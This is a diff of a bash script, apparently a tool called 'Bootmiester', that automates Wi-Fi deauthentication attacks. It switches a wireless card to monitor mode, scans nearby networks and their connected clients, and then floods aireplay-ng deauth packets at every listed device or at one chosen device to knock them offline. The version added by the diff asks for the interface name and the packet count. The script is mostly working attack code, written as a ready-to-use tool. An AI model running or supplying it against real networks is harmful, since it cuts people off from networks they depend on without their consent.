@@ -1,104 +1,170 @@
 #!/bin/bash
 
-Black='\033[0;30m'        # Black
-Red='\033[0;31m'          # Red
-Green='\033[0;32m'        # Green
-Yellow='\033[0;33m'       # Yellow
-Blue='\033[0;34m'         # Blue
-Purple='\033[0;35m'       # Purple
-Cyan='\033[0;36m'         # Cyan
-White='\033[0;37m'        # White
+Black='\033[1;30m'        # Black
+Red='\033[1;31m'          # Red
+Green='\033[1;32m'        # Green
+Yellow='\033[1;33m'       # Yellow
+Blue='\033[1;34m'         # Blue
+Purple='\033[1;35m'       # Purple
+Cyan='\033[1;36m'         # Cyan
+White='\033[1;37m'        # White
 NC='\033[0m'
 x=1;
+lred='\033[0;31m'
+white='\033[0;37m'
+PROCESS="xterm"
 
 clear
-mkdir ~/Desktop/MACS
-echo -e "${Green} Starting Monitor Mode on wlo1 ${NC}" 
-airmon-ng check kill && airmon-ng start wlo1
+echo -e "\tBOOTMIESTER\n\tBy: Yashvendra Kashyap\n\thttps://github.com/Yashvendra/Bootmiester" | boxes -d cat -a c | lolcat
+sleep 1
+echo -e "\n${white}+-------------------------------------------------------------+"
+echo -e "+                The ${Green}BOOTMIESTER${white} welcomes you                 +"
+echo -e "${white}+-------------------------------------------------------------+${NC}" 
+sleep 2
+echo -ne "${Blue}Do you want to \e[0;37m(${Blue}p\e[0;37m)${Blue}roceed with the script or \e[0;37m(${Blue}q\e[0;37m)${Blue}quit \e[0;37m(${Blue}p/q\e[0;37m)${Blue}: \e[0;37m"
+read op
 
-airodump-ng wlo1mon -w ~/Desktop/wifi
+if [[ "$op" = "p" ]]
+then
 
-clear
+	echo -ne "${Blue}Enter your wireless interface name: ${White}"
+	read interface
 
-awk -F, '{OFS=",";print $1}' ~/Desktop/wifi-01.kismet.csv | awk -F';' '{print $4}' | sed '1d' > ~/Desktop/MACS/wifi.txt
-awk -F, '{OFS=",";print $1}' ~/Desktop/wifi-01.kismet.csv | awk -F';' '{print $6}' | sed '1d' > ~/Desktop/MACS/channels.txt
+	mkdir ~/Desktop/MACS
+	echo -e "${Green}Starting Monitor Mode on "${interface}" ${NC}"
+	sleep 2
+	airmon-ng check kill && airmon-ng start ${interface}
+	airodump-ng ${interface}mon -w ~/Desktop/wifi
 
-echo -e "${Green} WIFI's around you are: ${NC}"
+	clear
 
-cat ~/Desktop/MACS/wifi.txt | while read p
-do 
-	echo "$x: $p"
-	x=$(( $x + 1 ))
-done
+	awk -F, '{OFS=",";print $1}' ~/Desktop/wifi-01.kismet.csv | awk -F';' '{print $4}' | sed '1d' > ~/Desktop/MACS/wifi.txt
+	awk -F, '{OFS=",";print $1}' ~/Desktop/wifi-01.kismet.csv | awk -F';' '{print $6}' | sed '1d' > ~/Desktop/MACS/channels.txt
 
-echo -ne  "${Blue}CHOOSE a WIFI: ${White}"
-read choice
+	echo -e "${Green} WIFI's around you are: ${NC}"
 
-bssid=`sed "$choice!d" ~/Desktop/MACS/wifi.txt`
-channel=`sed "$choice!d" ~/Desktop/MACS/channels.txt`
-
-airodump-ng --bssid $bssid --channel $channel wlo1mon -w ~/Desktop/devices
-sed '1,5d' ~/Desktop/devices-01.csv | awk -F "\"*,\"*" '{print $1}' | sed '$d' > ~/Desktop/MACS/devices.txt 
-
-x=2
-while [ $x -gt 1 ]
-do
-
-	x=1
-	echo -e "${Green}Devices to be booted from $bssid"
-	echo -e "${Red}-------------------------------------${NC}"
-	cat ~/Desktop/MACS/devices.txt | while read p
-	do
+	cat ~/Desktop/MACS/wifi.txt | while read p
+	do 
 		echo "$x: $p"
 		x=$(( $x + 1 ))
 	done
-	echo -e "${Green}Press 1 if you want to remove the above devices. Press 2 if you want to prevent a device to get booted.${NC}"
-	echo -ne "${Blue}Enter your Choice: ${White}"
-	read ch
 
-	if [ $ch -eq 2 ] 
-	then 
-		echo -e "${Red}-------------------------------------${NC}"
-		echo -e "${Blue}Enter the Device's Address for not to be booted: ${White}"
-		read mac
-		sed -i "/$mac/d" ~/Desktop/MACS/devices.txt 
-		echo -e "${Red}-------------------------------------${NC}"
-		x=2
-	elif [ $ch -eq 1 ] 
-	then
-		clear
-		a=100
-		echo -e "${Red}BOOTING the devices${Yellow} NOW"
-		cat ~/Desktop/MACS/devices.txt | while read q
-		do
-			xterm +hold -geometry 91x31+"$a"+500 -e "aireplay-ng --deauth 20 -a $bssid -c $q wlo1mon" & 	
-			a=$(( $a + 100 ))
-		done
+	echo -ne  "${Blue}CHOOSE a WIFI: ${White}"
+	read choice
+
+	bssid=`sed "$choice!d" ~/Desktop/MACS/wifi.txt`
+	channel=`sed "$choice!d" ~/Desktop/MACS/channels.txt`
+
+	airodump-ng --bssid $bssid --channel $channel ${interface}mon -w ~/Desktop/devices
+	sed '1,5d' ~/Desktop/devices-01.csv | awk -F "\"*,\"*" '{print $1}' | sed '$d' > ~/Desktop/MACS/devices.txt 
+
+	x=2
+	while [ $x -gt 1 ]
+	do
+
 		x=1
-
-		PROCESS="xterm"
-		while true
+		clear
+        	echo -e "${Blue}+-------------------------------------------------------+"
+       	        echo -e "+\t${Green}Devices to be booted from ${Yellow}[${Purple}$bssid${Yellow}]   ${Blue}+"
+        	echo -e "${Blue}+-------------------------------------------------------+${NC}"
+        	sleep 1
+		echo -e "${Blue}+                                                       +${NC}"
+		cat ~/Desktop/MACS/devices.txt | while read p
 		do
-			if pgrep -x "$PROCESS" >/dev/null
-			then 
-				echo -n -e "${NC}."
-				sleep 2
-				continue
-			else
-				echo ""
-				echo -e "${Green}Stopping Monitor mode on the interface...${NC}"
-				xterm +hold -e "airmon-ng stop wlo1mon && service network-manager restart"
-				sleep 2
-				echo -e "${Green}Deleting the captured files..."
-				sleep 2
-				rm -rf ~/Desktop/devices-*
-				rm -rf ~/Desktop/wifi-*
-				rm -rf ~/Desktop/MACS
-				echo -e "${Green}DONE."
-				break
-			fi
+			echo -e "${Blue}+ ${White}$x.${Purple} $p                                  ${Blue}+"
+			x=$(( $x + 1 ))
 		done
+		echo -e "${Blue}+-------------------------------------------------------+${NC}\n"
+		sleep 1
+		echo -e "${Green}Press 1 if you want to boot the above devices.\nPress 2 if you want to prevent a device to be booted.\nPress 3 If you want to boot a particular device.${NC}"
+		echo -ne "${Blue}Enter your Choice: ${White}"
+		read ch
 
-	fi
-done
+		if [ $ch -eq 2 ] 
+		then 
+			sleep 1
+			echo -ne "${Blue}Enter the Device's Address which should not be booted: ${White}"
+			read mac
+			sed -i "/$mac/d" ~/Desktop/MACS/devices.txt 
+			sleep 1
+			x=2
+		elif [ $ch -eq 1 ] 
+		then
+			echo -ne "${Blue}Enter number of deauth packets to send: ${White}"
+			read packets
+			clear
+			sleep 1
+			a=100
+			echo -e "${Red}BOOTING the devices${Yellow} NOW"
+			sleep 1
+			cat ~/Desktop/MACS/devices.txt | while read q
+			do
+				xterm +hold -geometry 91x31+"$a"+500 -e "aireplay-ng --deauth ${packets} -a $bssid -c $q ${interface}mon" & 	
+				a=$(( $a + 100 ))
+			done
+			x=1
 
+			while true
+			do
+				if pgrep -x "$PROCESS" >/dev/null
+				then 
+					echo -n -e "${NC}."
+					sleep 2
+					continue
+				else
+					echo ""
+					echo -e "${Green}Stopping Monitor mode on the interface...${NC}"
+					xterm +hold -geometry 91x31+700+500 -e "airmon-ng stop ${interface}mon && service network-manager restart"
+					sleep 2
+					echo -e "${Green}Deleting the captured files..."
+					sleep 2
+					rm -rf ~/Desktop/devices-*
+					rm -rf ~/Desktop/wifi-*
+					rm -rf ~/Desktop/MACS
+					echo -e "${Green}DONE."
+					break
+				fi
+			done
+		elif [ $ch -eq 3 ]
+		then
+                        sleep 1
+                        echo -ne "${Blue}Enter the Device's Address which should be booted: ${White}"
+                        read mac
+			echo -ne "${Blue}Enter number of deauth packets to send: ${White}"
+			read packets
+			sleep 1
+			clear
+			echo -e "${Red}BOOTING ${White}$mac ${Yellow}NOW"
+			sleep 1
+			xterm +hold -geometry 91x31+700+500 -e "aireplay-ng --deauth $packets -a $bssid -c $mac ${interface}mon" &
+			x=1
+		        while true
+                        do
+                                if pgrep -x "$PROCESS" >/dev/null
+                                then
+                                        echo -n -e "${NC}."
+                                        sleep 2
+                                        continue
+                                else
+                                        echo ""
+                                        echo -e "${Green}Stopping Monitor mode on the interface...${NC}"
+                                        xterm +hold -geometry 91x31+700+500 -e "airmon-ng stop ${interface}mon && service network-manager restart"
+                                        sleep 2
+                                        echo -e "${Green}Deleting the captured files..."
+                                        sleep 2
+                                        rm -rf ~/Desktop/devices-*
+                                        rm -rf ~/Desktop/wifi-*
+                                        rm -rf ~/Desktop/MACS
+                                        echo -e "${Green}DONE."
+                                        break
+                                fi
+                        done
+
+		fi
+	done
+
+else
+	echo -e "Byee! See you soon"
+	sleep 1
+	exit
+fi
